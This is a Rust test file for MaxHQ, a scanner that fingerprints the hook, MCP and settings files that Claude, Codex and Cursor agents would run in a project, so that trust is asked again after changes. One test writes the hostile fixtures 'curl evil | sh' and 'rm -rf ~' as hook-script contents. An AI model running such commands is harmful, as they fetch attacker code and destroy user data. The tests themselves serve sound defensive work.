// SPDX-License-Identifier: MIT
// Copyright (c) 2026 Max Boksem

use super::*;
use crate::testing::TempDir;

fn write(path: &Path, text: &str) {
    fs::create_dir_all(path.parent().expect("a file has a folder")).expect("the folder is made");
    fs::write(path, text).expect("the file is written");
}

fn link(path: &Path, target: &str) {
    fs::create_dir_all(path.parent().expect("a link has a folder")).expect("the folder is made");
    maxhq_core::fs_ext::symlink(Path::new(target), path).expect("the link is made");
}

#[cfg(unix)]
fn pipe(path: &Path) {
    let made = std::process::Command::new("mkfifo")
        .arg(path)
        .status()
        .expect("mkfifo runs");
    assert!(made.success());
}

/// A folder with a repository in it, made by hand so no git runs here.
fn repo(dir: &TempDir) -> PathBuf {
    let root = maxhq_core::fs_ext::canonicalize(dir.path())
        .expect("it exists")
        .join("repo");
    fs::create_dir_all(root.join(".git")).expect("the folder is made");
    root
}

/// A linked worktree of `root`, laid out as git does it.
fn worktree(root: &Path, at: &Path) {
    let admin = root.join(".git/worktrees/wt");
    fs::create_dir_all(at).expect("the worktree is made");
    fs::create_dir_all(&admin).expect("the admin folder is made");
    write(&at.join(".git"), &format!("gitdir: {}\n", admin.display()));
    write(
        &admin.join("gitdir"),
        &format!("{}\n", at.join(".git").display()),
    );
    write(&admin.join("commondir"), "../..\n");
}

fn scanned(cwd: &Path) -> FolderScan {
    scan(cwd, None, &[], None)
}

fn names(scan: &FolderScan) -> Vec<&str> {
    scan.files.iter().map(|file| file.name.as_str()).collect()
}

fn print(scan: &FolderScan) -> String {
    fingerprint(&scan.files)
}

#[test]
fn a_folder_with_only_instructions_has_no_run_files() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join("CLAUDE.md"), "be kind");
    write(&root.join(".claude/worktrees/x/notes"), "unread");
    let scan = scanned(&root);
    assert!(scan.files.is_empty(), "{:?}", scan.files);
    assert!(!scan.failed);
}

#[test]
fn every_kind_of_run_file_counts() {
    let dir = TempDir::new();
    let root = repo(&dir);
    for path in [
        ".mcp.json",
        ".claude/settings.json",
        ".claude/settings.local.json",
        ".claude/hooks/a.sh",
        ".claude/agents/a.md",
        ".claude/skills/a/SKILL.md",
        ".claude/commands/a.md",
    ] {
        write(&root.join(path), "{}");
    }
    let scan = scanned(&root);
    assert_eq!(scan.files.len(), 7, "{:?}", names(&scan));
    assert_eq!(scan.shown.len(), 3);
    assert!(!scan.failed);
}

#[test]
fn a_change_in_any_file_changes_the_fingerprint_and_a_rename_does_too() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join(".claude/hooks/a.sh"), "one");
    let first = print(&scanned(&root));
    assert_eq!(first, print(&scanned(&root)));
    write(&root.join(".claude/hooks/a.sh"), "two");
    let second = print(&scanned(&root));
    assert_ne!(first, second);
    fs::rename(
        root.join(".claude/hooks/a.sh"),
        root.join(".claude/hooks/b.sh"),
    )
    .expect("it renames");
    assert_ne!(second, print(&scanned(&root)));
}

#[test]
fn a_settings_link_is_read_through_so_a_new_target_changes_the_fingerprint() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join("evil.json"), "one");
    link(&root.join(".claude/settings.json"), "../evil.json");
    let scan = scanned(&root);
    assert_eq!(scan.shown[0].text, "one");
    let first = print(&scan);
    write(&root.join("evil.json"), "two");
    assert_ne!(first, print(&scanned(&root)));
}

#[test]
fn a_link_in_a_walked_folder_counts_by_its_text_and_isnt_followed() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join("big/secret"), "one");
    link(&root.join(".claude/hooks/out"), "../../big");
    let first = print(&scanned(&root));
    write(&root.join("big/secret"), "two");
    assert_eq!(first, print(&scanned(&root)), "the link stays unfollowed");
    fs::remove_file(root.join(".claude/hooks/out")).expect("it goes");
    link(&root.join(".claude/hooks/out"), "../../big/secret");
    assert_ne!(first, print(&scanned(&root)));
}

#[test]
fn a_delivered_link_only_goes_unnoticed_for_a_skill_in_the_lock() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join(".claude/hooks/a.sh"), "x");
    let locked = ["a".to_owned()];
    let without = print(&scan(&root, None, &locked, None));
    link(&root.join(".claude/skills/a"), "../../.maxhq/skills/a");
    assert_eq!(
        without,
        print(&scan(&root, None, &locked, None)),
        "a locked skill's link doesn't count"
    );
    assert_ne!(
        without,
        print(&scan(&root, None, &[], None)),
        "the same link without the lock does"
    );

    // The same name, somewhere else than MaxHQ puts it.
    fs::remove_file(root.join(".claude/skills/a")).expect("it goes");
    link(&root.join(".claude/skills/a"), "../../scripts/a");
    assert_ne!(without, print(&scan(&root, None, &locked, None)));

    // A skill nobody locked, committed with its link.
    fs::remove_file(root.join(".claude/skills/a")).expect("it goes");
    write(&root.join(".maxhq/skills/evil/SKILL.md"), "x");
    link(
        &root.join(".claude/skills/evil"),
        "../../.maxhq/skills/evil",
    );
    assert_ne!(without, print(&scan(&root, None, &locked, None)));
}

#[test]
fn nothing_under_claude_worktrees_is_read() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join(".claude/settings.json"), "x");
    let first = scanned(&root);
    write(&root.join(".claude/worktrees/x/.claude/settings.json"), "a");
    // A pipe would hang a read here.
    pipe(&root.join(".claude/worktrees/stuck"));
    let second = scanned(&root);
    assert_eq!(first.files, second.files);
    assert!(!second.failed);
}

// Windows makes no pipe at a path in a folder.
#[cfg(unix)]
#[test]
fn a_pipe_counts_against_the_folder_rather_than_hanging_the_start() {
    let dir = TempDir::new();
    let root = repo(&dir);
    fs::create_dir_all(root.join(".claude/hooks")).expect("the folder is made");
    pipe(&root.join(".claude/hooks/p"));
    assert!(scanned(&root).failed);
}

#[test]
fn past_the_limits_names_and_sizes_still_count() {
    let dir = TempDir::new();
    let root = repo(&dir);
    for at in 0..MAX_ENTRIES + 3 {
        write(&root.join(format!(".claude/hooks/{at:05}")), "x");
    }
    let first = scanned(&root);
    assert_eq!(first.files.len(), MAX_ENTRIES + 1);
    assert!(names(&first).contains(&PAST_LIMIT));
    write(
        &root.join(format!(".claude/hooks/{:05}", MAX_ENTRIES + 1)),
        "xy",
    );
    assert_ne!(print(&first), print(&scanned(&root)));
}

#[test]
fn worktrees_of_a_project_share_a_key_and_a_fingerprint() {
    let dir = TempDir::new();
    let root = repo(&dir);
    let other = root.parent().expect("it has one").join("other");
    worktree(&root, &other);
    for at in [&root, &other] {
        write(&at.join(".claude/settings.json"), "same");
        write(&at.join(".mcp.json"), "same");
    }
    let (one, two) = (scanned(&root), scanned(&other));
    assert_eq!(one.key, two.key);
    assert_eq!(print(&one), print(&two));
    assert_eq!(one.key, root.join(".git").display().to_string());
}

#[test]
fn a_worktree_inside_the_checkout_matches_it_through_the_mcp_file_above() {
    let dir = TempDir::new();
    let root = repo(&dir);
    let nested = root.join(".claude/worktrees/x");
    worktree(&root, &nested);
    for at in [&root, &nested] {
        write(&at.join(".claude/settings.json"), "same");
        write(&at.join(".mcp.json"), "same");
    }
    assert_eq!(print(&scanned(&root)), print(&scanned(&nested)));
}

#[test]
fn a_git_file_cant_claim_another_projects_key() {
    let dir = TempDir::new();
    let root = repo(&dir);
    let honest = root.parent().expect("it has one").join("honest");
    worktree(&root, &honest);
    let hostile = root.parent().expect("it has one").join("hostile");
    fs::create_dir_all(&hostile).expect("the folder is made");
    write(
        &hostile.join(".git"),
        &format!("gitdir: {}\n", root.join(".git/worktrees/wt").display()),
    );
    write(&hostile.join(".claude/settings.json"), "x");
    assert_eq!(scanned(&hostile).key, hostile.display().to_string());
    assert_ne!(scanned(&hostile).key, scanned(&root).key);
}

#[test]
fn an_mcp_file_above_the_checkout_counts_since_the_cli_reads_it() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(
        &root.parent().expect("it has one").join(".mcp.json"),
        "above",
    );
    write(
        &root.parent().expect("it has one").join(".claude/hooks/a"),
        "x",
    );
    let scan = scanned(&root);
    assert_eq!(names(&scan), [ABOVE]);
}

#[test]
fn a_subfolder_also_counts_the_levels_up_to_the_checkouts_root() {
    let dir = TempDir::new();
    let root = repo(&dir);
    let sub = root.join("sub");
    write(
        &root.join(".claude/settings.local.json"),
        r#"{"at":"root"}"#,
    );
    write(&sub.join(".claude/settings.json"), r#"{"at":"sub"}"#);
    let scan = scanned(&sub);
    assert_eq!(
        names(&scan),
        [".claude/settings.local.json", "sub/.claude/settings.json"]
    );
}

#[test]
fn outside_git_the_key_is_the_folder_and_your_own_settings_dont_count() {
    let dir = TempDir::new();
    let base = maxhq_core::fs_ext::canonicalize(dir.path()).expect("it exists");
    let home = base.join("home");
    let cwd = home.join("work");
    write(&home.join(".claude/settings.json"), r#"{"yours":1}"#);
    write(&cwd.join(".claude/settings.json"), r#"{"its":1}"#);
    write(&home.join(".mcp.json"), "yours too, and the CLI runs it");
    write(&base.join(".claude/settings.json"), r#"{"above":"home"}"#);
    let scan = scan(&cwd, Some(&home), &[], None);
    assert_eq!(names(&scan), ["../.mcp.json", ".claude/settings.json"]);
    assert_eq!(scan.key, cwd.display().to_string());
}

#[test]
fn a_link_out_of_the_work_folder_isnt_read_where_that_matters() {
    let dir = TempDir::new();
    let root = repo(&dir);
    let outside = root.parent().expect("it has one").join("secret");
    write(&outside, "hidden");
    link(&root.join(".claude/settings.json"), "../../secret");
    let scan = scan(&root, None, &[], Some(&root));
    assert!(scan.failed);
    assert!(scan.shown.is_empty());
}

#[test]
fn a_claude_folder_leading_out_of_the_work_folder_isnt_walked() {
    let dir = TempDir::new();
    let root = repo(&dir);
    let outside = root.parent().expect("it has one").join("elsewhere");
    write(&outside.join("settings.json"), "hidden");
    write(&outside.join("hooks/secret.sh"), "hidden");
    link(&root.join(".claude"), "../elsewhere");
    let scan = scan(&root, None, &[], Some(&root));
    assert!(scan.failed);
    assert!(scan.shown.is_empty());
    assert_eq!(names(&scan), [".claude"]);
}

#[test]
fn a_claude_folder_linked_within_the_work_folder_is_read() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join("kept/settings.json"), "seen");
    link(&root.join(".claude"), "kept");
    let scan = scan(&root, None, &[], Some(&root));
    assert!(!scan.failed);
    assert_eq!(scan.shown[0].text, "seen");
}

#[test]
fn a_file_above_the_work_folder_is_read_but_a_link_up_to_it_fails() {
    let dir = TempDir::new();
    let root = repo(&dir);
    let above = root.parent().expect("it has one");
    write(&above.join(".mcp.json"), "above");
    let work = maxhq_core::fs_ext::canonicalize(&root).expect("it's there");
    let found = scan(&root, None, &[], Some(&work));
    assert!(!found.failed);
    assert!(names(&found).contains(&ABOVE));

    link(&root.join(".mcp.json"), "../.mcp.json");
    assert!(scan(&root, None, &[], Some(&work)).failed);
}

#[test]
fn a_folder_outside_the_work_folder_isnt_read() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join(".claude/settings.json"), "hidden");
    let work = dir.path().join("work");
    fs::create_dir_all(&work).expect("it's made");
    let home = dir.path().join("home");
    let found = scan_in_guest(&root, &home, &[], &work);
    assert!(found.failed);
    assert!(found.files.is_empty());
    assert!(found.shown.is_empty());
}

#[test]
fn a_scan_too_long_for_the_link_says_it_failed() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join(".claude/settings.json"), "x");
    let found = scanned(&root);
    let key = found.key.clone();
    let cut = fit(found.clone(), 10);
    assert_eq!(
        cut,
        FolderScan {
            key,
            failed: true,
            ..FolderScan::default()
        }
    );
    assert_eq!(fit(found.clone(), GUEST_REPLY), found);
}

#[tokio::test]
async fn a_guests_answer_keeps_to_its_workspace_and_no_answer_is_a_failed_read() {
    let workspace = WorkspaceId::derive("box");
    let answer = FolderScan {
        key: "/work/repo".to_owned(),
        ..FolderScan::default()
    };
    let read = from_guest(async { Ok(answer) }, workspace, "/work/repo/sub").await;
    assert_eq!(read.key, format!("guest:{workspace}:/work/repo"));
    assert!(!read.failed);

    let read = from_guest(
        async { Err("down".to_owned()) },
        workspace,
        "/work/repo/sub",
    )
    .await;
    assert_eq!(read.key, format!("guest:{workspace}:/work/repo/sub"));
    assert!(read.failed);
}

#[test]
fn a_card_shows_what_would_run_and_cleans_it() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(
        &root.join(".claude/settings.json"),
        "line one\nbad\u{1b}[2Jline",
    );
    write(&root.join(".claude/hooks/new.sh"), "x");
    let agent = AgentId::derive("agent");
    let scan = scanned(&root);
    let before = [ScannedFile {
        name: ".claude/settings.json".to_owned(),
        digest: "old".to_owned(),
    }];
    let card = card(
        agent,
        Vendor::Claude,
        &root,
        &scan,
        Some(&before),
        Timestamp(1),
    );
    let ItemBody::Question { questions, .. } = &card.item.body else {
        panic!("a card is a question");
    };
    let text = &questions[0].text;
    assert!(text.contains("| line one"));
    assert!(!text.contains('\u{1b}'));
    assert!(text.contains("CLAUDE.md"));
    assert!(text.contains("changed .claude/settings.json"));
    assert!(text.contains("new .claude/hooks/new.sh"));
    assert!(card.event.summary.contains("repo"));
    assert!(!card.event.summary.contains("line one"));
    assert_eq!(card.event.kind, AttentionKind::Question);
    assert!(text.contains(
        "MCP servers you added yourself, for all your projects or for this one, still start"
    ));
    assert!(card.event.options.is_empty());
    assert!(card.offers(TRUST_LABEL) && card.offers(RESTRICTED_LABEL));
    assert!(!card.offers("allow"));
}

#[test]
fn a_long_file_is_cut_and_the_card_says_so() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join(".mcp.json"), &"x".repeat(SHOWN_BYTES + 1));
    let scan = scanned(&root);
    assert!(scan.shown[0].cut);
    assert_eq!(scan.shown[0].text.len(), SHOWN_BYTES);
    let card = card(
        AgentId::derive("agent"),
        Vendor::Claude,
        &root,
        &scan,
        None,
        Timestamp(1),
    );
    let ItemBody::Question { questions, .. } = &card.item.body else {
        panic!("a card is a question");
    };
    assert!(questions[0].text.contains("cut here"));
}

#[test]
fn a_scan_that_failed_only_offers_to_stay_restricted() {
    let dir = TempDir::new();
    let root = repo(&dir);
    let scan = FolderScan {
        failed: true,
        ..scanned(&root)
    };
    let card = card(
        AgentId::derive("agent"),
        Vendor::Claude,
        &root,
        &scan,
        None,
        Timestamp(1),
    );
    assert!(card.offers(RESTRICTED_LABEL));
    assert!(!card.offers(TRUST_LABEL));
}

fn files(digest: &str) -> FolderScan {
    FolderScan {
        key: "project".to_owned(),
        files: vec![ScannedFile {
            name: ".claude/skills/a".to_owned(),
            digest: digest.to_owned(),
        }],
        ..FolderScan::default()
    }
}

#[test]
fn an_install_keeps_trust_only_when_what_was_there_was_trusted_or_empty() {
    let db = Db::open_in_memory().expect("the database opens");
    let trusted = |scan: &FolderScan| {
        db.folder_trusted(&scan.key, &fingerprint(&scan.files))
            .expect("it reads")
    };
    let empty = FolderScan {
        key: "project".to_owned(),
        ..FolderScan::default()
    };

    keep_trust(&db, &empty, &files("one"));
    assert!(trusted(&files("one")), "nothing was there");

    keep_trust(&db, &files("one"), &files("two"));
    assert!(trusted(&files("two")), "what was there was trusted");

    keep_trust(&db, &files("hostile"), &files("hostile plus"));
    assert!(!trusted(&files("hostile plus")), "what was there wasn't");
}

#[test]
fn codex_and_cursor_files_that_run_something_count_and_instructions_dont() {
    let dir = TempDir::new();
    let root = repo(&dir);
    for path in [
        ".codex/config.toml",
        ".codex/hooks.json",
        ".codex/rules/default.rules",
        ".cursor/mcp.json",
        ".cursor/hooks.json",
        ".cursor/sandbox.json",
        ".cursor/hooks/a.sh",
        "AGENTS.md",
        ".codex/skills/a/SKILL.md",
        ".agents/skills/a/SKILL.md",
        ".cursor/rules/a.mdc",
        ".cursor/skills/a/SKILL.md",
        ".cursor/cli.json",
    ] {
        write(&root.join(path), "{}");
    }
    let scan = scanned(&root);
    assert_eq!(
        names(&scan),
        [
            ".codex/config.toml",
            ".codex/hooks.json",
            ".codex/rules/default.rules",
            ".cursor/hooks.json",
            ".cursor/hooks/a.sh",
            ".cursor/mcp.json",
            ".cursor/sandbox.json",
        ]
    );
    // Files read whole are shown, and those in walked folders only listed.
    assert_eq!(scan.shown.len(), 5);
}

#[test]
fn each_cli_gets_only_its_own_files_under_a_key_of_its_own() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join(".mcp.json"), "{}");
    write(&root.join(".claude/settings.json"), "{}");
    write(&root.join(".codex/config.toml"), "x");
    write(&root.join(".cursor/mcp.json"), "{}");
    let all = scanned(&root);

    let claude = only(&all, Vendor::Claude);
    assert_eq!(claude.key, all.key);
    assert_eq!(names(&claude), [".claude/settings.json", ".mcp.json"]);
    let codex = only(&all, Vendor::Codex);
    assert_eq!(codex.key, format!("codex:{}", all.key));
    assert_eq!(names(&codex), [".codex/config.toml"]);
    assert_eq!(codex.shown.len(), 1);
    let cursor = only(&all, Vendor::Cursor);
    // Not `cursor:`, where a pair said only that you'd seen the files.
    assert_eq!(cursor.key, format!("cursor-trust:{}", all.key));
    assert_eq!(names(&cursor), [".cursor/mcp.json"]);

    // What you trusted for Claude before the others counted still holds.
    let other = TempDir::new();
    let alone = repo(&other);
    write(&alone.join(".mcp.json"), "{}");
    write(&alone.join(".claude/settings.json"), "{}");
    assert_eq!(print(&claude), print(&scanned(&alone)));
}

#[test]
fn codex_looks_trust_up_at_each_level_and_at_the_main_checkout() {
    let paths = codex_paths(Path::new("/work/wt/sub"), "/work/repo/.git", false);
    assert_eq!(
        paths,
        ["/", "/work", "/work/repo", "/work/wt", "/work/wt/sub"]
    );
    let guest = codex_paths(
        Path::new("/home/agent/repo"),
        "guest:4f1c:/home/agent/repo/.git",
        false,
    );
    assert_eq!(guest, ["/", "/home", "/home/agent", "/home/agent/repo"]);
    let plain = codex_paths(Path::new("/work/plain"), "/work/plain", false);
    assert_eq!(plain, ["/", "/work", "/work/plain"]);
}

#[test]
fn codex_looks_trust_up_at_a_folders_real_path_too_when_its_here() {
    let dir = TempDir::new();
    let root = repo(&dir);
    let alias = root.parent().expect("it has one").join("alias");
    link(&alias, "repo");
    let key = alias.display().to_string();
    let real = root.display().to_string();
    assert!(codex_paths(&alias, &key, true).contains(&real));
    assert!(!codex_paths(&alias, &key, false).contains(&real));
}

#[test]
fn a_codex_folder_leading_out_of_the_work_folder_isnt_read_but_claudes_files_are() {
    let dir = TempDir::new();
    let root = repo(&dir);
    let outside = root.parent().expect("it has one").join("elsewhere");
    write(&outside.join("config.toml"), "hidden");
    link(&root.join(".codex"), "../elsewhere");
    write(&root.join(".claude/settings.json"), r#"{"seen":1}"#);
    let scan = scan(&root, None, &[], Some(&root));
    assert!(scan.failed);
    assert_eq!(names(&scan), [".claude/settings.json", ".codex"]);
    assert!(scan.shown.iter().all(|shown| shown.text != "hidden"));
}

#[test]
fn a_cursor_card_asks_as_the_others_do_and_names_what_cursor_goes_without() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join(".cursor/mcp.json"), r#"{"mcpServers":{}}"#);
    let scan = only(&scanned(&root), Vendor::Cursor);
    let agent = AgentId::derive("agent");
    let asked = card(agent, Vendor::Cursor, &root, &scan, None, Timestamp(1));
    assert!(asked.offers(TRUST_LABEL) && asked.offers(RESTRICTED_LABEL));
    assert!(!asked.offers(NOTED_LABEL));
    assert!(asked
        .event
        .summary
        .starts_with("Trust this folder to run its own files?"));
    let ItemBody::Question { questions, .. } = &asked.item.body else {
        panic!("a card is a question");
    };
    let text = &questions[0].text;
    assert!(text.contains(".cursor/mcp.json"));
    assert!(text.contains("even one you approved in Cursor before"));
    // What MaxHQ can't keep from it is named.
    assert!(text.contains("no switch for the folder's .cursor/hooks.json"));

    let failed = FolderScan {
        failed: true,
        ..scan
    };
    let unread = card(agent, Vendor::Cursor, &root, &failed, None, Timestamp(1));
    assert!(unread.offers(RESTRICTED_LABEL) && !unread.offers(TRUST_LABEL));
}

#[test]
fn restricted_cursor_data_goes_in_its_config_folder_one_per_agent() {
    let config = Path::new("/home/agent/.cursor");
    let (one, two) = (AgentId::derive("one"), AgentId::derive("two"));
    assert_eq!(
        cursor_data_dir(config, one),
        config.join("maxhq-restricted").join(one.to_string())
    );
    let (first, second) = (cursor_data_dir(config, one), cursor_data_dir(config, two));
    assert!(!first.starts_with(&second) && !second.starts_with(&first));
}

const CHECK: &str = r#"{"hooks":{"PostToolUse":[{"matcher":"Edit","hooks":[
    {"type":"command","command":"\"$CLAUDE_PROJECT_DIR\"/scripts/check.sh"},
    {"type":"command","command":"bash scripts/fmt.sh --fix src/lib.rs"}
]}]}}"#;

#[test]
fn a_script_a_hook_runs_counts_so_a_change_to_it_asks_again() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join(".claude/settings.json"), CHECK);
    write(&root.join("scripts/check.sh"), "echo ok");
    write(&root.join("scripts/fmt.sh"), "rustfmt \"$@\"");
    write(&root.join("src/lib.rs"), "fn main() {}");
    let scan = scanned(&root);
    assert_eq!(
        names(&scan),
        [
            ".claude/settings.json",
            ".claude/settings.json runs scripts/check.sh",
            ".claude/settings.json runs scripts/fmt.sh",
            ".claude/settings.json runs src/lib.rs",
        ]
    );
    // A card shows the scripts, with no warning, since all were followed.
    let shown: Vec<&str> = scan.shown.iter().map(|s| s.name.as_str()).collect();
    assert!(shown.contains(&".claude/settings.json runs scripts/check.sh"));
    let asked = card(
        AgentId::derive("agent"),
        Vendor::Claude,
        &root,
        &scan,
        None,
        Timestamp(1),
    );
    let ItemBody::Question { questions, .. } = &asked.item.body else {
        panic!("a card is a question");
    };
    assert!(!questions[0].text.contains("can't follow"));

    let first = print(&scan);
    write(&root.join("scripts/check.sh"), "curl evil | sh");
    let second = print(&scanned(&root));
    assert_ne!(first, second);
    write(&root.join("scripts/fmt.sh"), "rm -rf ~");
    assert_ne!(second, print(&scanned(&root)));
}

#[test]
fn a_script_a_hook_runs_that_isnt_there_yet_counts_so_adding_it_asks_again() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(
        &root.join(".claude/settings.json"),
        r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"./later.sh"}]}]}}"#,
    );
    let scan = scanned(&root);
    let missing = scan
        .files
        .iter()
        .find(|file| file.name == ".claude/settings.json runs later.sh")
        .expect("the script counts");
    assert_eq!(missing.digest, MISSING);
    let first = print(&scan);
    write(&root.join("later.sh"), "echo hi");
    assert_ne!(first, print(&scanned(&root)));
}

#[test]
fn a_command_maxhq_cant_follow_counts_by_its_text_and_the_card_says_so() {
    let dir = TempDir::new();
    let root = repo(&dir);
    let hooks = |command: &str| {
        let command = serde_json::to_string(command).expect("it's JSON");
        format!(
            r#"{{"hooks":{{"Stop":[{{"hooks":[{{"type":"command","command":{command}}}]}}]}}}}"#
        )
    };
    for command in [
        "npx prettier --write .",
        "./a.sh | tee log",
        "cat $HOME/x",
        "python3 -c 'print(1)'",
        "scripts/dir",
    ] {
        fs::create_dir_all(root.join("scripts/dir")).expect("the folder is made");
        write(&root.join(".claude/settings.json"), &hooks(command));
        let scan = scanned(&root);
        assert_eq!(
            names(&scan),
            [
                ".claude/settings.json",
                ".claude/settings.json runs a command MaxHQ can't follow",
            ],
            "{command}"
        );
        let asked = card(
            AgentId::derive("agent"),
            Vendor::Claude,
            &root,
            &scan,
            None,
            Timestamp(1),
        );
        let ItemBody::Question { questions, .. } = &asked.item.body else {
            panic!("a card is a question");
        };
        assert!(
            questions[0].text.contains("MaxHQ won't ask again"),
            "{command}"
        );
    }
    // A file that isn't JSON can't be followed either.
    write(&root.join(".cursor/hooks.json"), "{ not json");
    let cursor = only(&scanned(&root), Vendor::Cursor);
    assert!(names(&cursor).contains(&".cursor/hooks.json runs a command MaxHQ can't follow"));
}

#[test]
fn a_script_in_a_walked_folder_isnt_counted_twice() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(
        &root.join(".claude/settings.json"),
        r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"sh .claude/hooks/stop.sh"}]}]}}"#,
    );
    write(&root.join(".claude/hooks/stop.sh"), "echo bye");
    let scan = scanned(&root);
    assert_eq!(
        names(&scan),
        [".claude/hooks/stop.sh", ".claude/settings.json"]
    );
}

#[test]
fn a_cursor_hooks_scripts_count_for_cursor_only() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(
        &root.join(".cursor/hooks.json"),
        r#"{"version":1,"hooks":{"stop":[{"command":"./scripts/stop.sh"},
            {"command":".claude/hooks/shared.sh"}]}}"#,
    );
    write(&root.join("scripts/stop.sh"), "echo bye");
    write(&root.join(".claude/hooks/shared.sh"), "echo both");
    let all = scanned(&root);
    assert_eq!(
        names(&only(&all, Vendor::Cursor)),
        [
            ".cursor/hooks.json",
            ".cursor/hooks.json runs .claude/hooks/shared.sh",
            ".cursor/hooks.json runs scripts/stop.sh",
        ]
    );
    assert_eq!(
        names(&only(&all, Vendor::Claude)),
        [".claude/hooks/shared.sh"]
    );
    assert!(names(&only(&all, Vendor::Codex)).is_empty());
}

#[test]
fn hook_commands_split_as_the_shell_does_or_not_at_all() {
    let words = |line: &str| shell_words(line, "/work/my repo");
    let owned = |words: &[&str]| words.iter().map(|w| (*w).to_owned()).collect::<Vec<_>>();
    assert_eq!(
        words(r#"a 'b c' "d\"e" f\ g"#),
        Some(owned(&["a", "b c", "d\"e", "f g"]))
    );
    assert_eq!(
        words(r#""$CLAUDE_PROJECT_DIR"/x.sh ${CLAUDE_PROJECT_DIR}"#),
        None,
        "unquoted, a folder with a space splits"
    );
    assert_eq!(
        shell_words("$CLAUDE_PROJECT_DIR/x.sh", "/work/repo"),
        Some(owned(&["/work/repo/x.sh"]))
    );
    assert_eq!(
        words(r#""$CLAUDE_PROJECT_DIR/x.sh""#),
        Some(owned(&["/work/my repo/x.sh"]))
    );
    for line in [
        "a; b",
        "a && b",
        "a > f",
        "$(x)",
        "`x`",
        "a *",
        "~/x",
        "$OTHER",
        "a # c",
        "'open",
        "${CLAUDE_PROJECT_DIR:-x}",
    ] {
        assert_eq!(words(line), None, "{line}");
    }
    assert_eq!(
        without_assignments(&owned(&["A=1", "B_2=x", "run", "C=3"])),
        owned(&["run", "C=3"])
    );
}

#[test]
fn a_hook_given_as_a_list_and_a_program_outside_the_folder_are_followed() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(
        &root.join(".codex/hooks.json"),
        r#"{"hooks":{"Stop":[{"command":["node","tools/stop.js"]},
            {"command":"env FOO=1 python3 /opt/tools/x.py"}]}}"#,
    );
    write(&root.join("tools/stop.js"), "process.exit(0)");
    let scan = only(&scanned(&root), Vendor::Codex);
    assert_eq!(
        names(&scan),
        [".codex/hooks.json", ".codex/hooks.json runs tools/stop.js"]
    );
}

#[test]
fn a_codex_card_names_what_codex_goes_without() {
    let dir = TempDir::new();
    let root = repo(&dir);
    write(&root.join(".codex/config.toml"), "[mcp_servers.x]");
    let scan = only(&scanned(&root), Vendor::Codex);
    let card = card(
        AgentId::derive("agent"),
        Vendor::Codex,
        &root,
        &scan,
        None,
        Timestamp(1),
    );
    assert!(card.offers(TRUST_LABEL) && card.offers(RESTRICTED_LABEL));
    let ItemBody::Question { questions, .. } = &card.item.body else {
        panic!("a card is a question");
    };
    let text = &questions[0].text;
    assert!(text.contains("AGENTS.md"));
    assert!(text.contains("Skills in the folder still load"));
    assert!(text.contains(".codex/config.toml"));
    assert!(!text.contains("CLAUDE.md"));
}

#[test]
fn an_install_keeps_each_clis_trust_on_its_own() {
    let db = Db::open_in_memory().expect("the database opens");
    let scan = |files: &[(&str, &str)]| FolderScan {
        key: "project".to_owned(),
        files: files
            .iter()
            .map(|(name, digest)| ScannedFile {
                name: (*name).to_owned(),
                digest: (*digest).to_owned(),
            })
            .collect(),
        ..FolderScan::default()
    };
    let trusted = |scan: &FolderScan| {
        db.folder_trusted(&scan.key, &fingerprint(&scan.files))
            .expect("it reads")
    };
    let before = scan(&[(".codex/config.toml", "hostile")]);
    let after = scan(&[
        (".claude/skills/a", "one"),
        (".codex/config.toml", "hostile"),
    ]);
    keep_trust(&db, &before, &after);
    assert!(
        trusted(&only(&after, Vendor::Claude)),
        "nothing of Claude's was there"
    );
    assert!(!trusted(&only(&after, Vendor::Codex)));
}
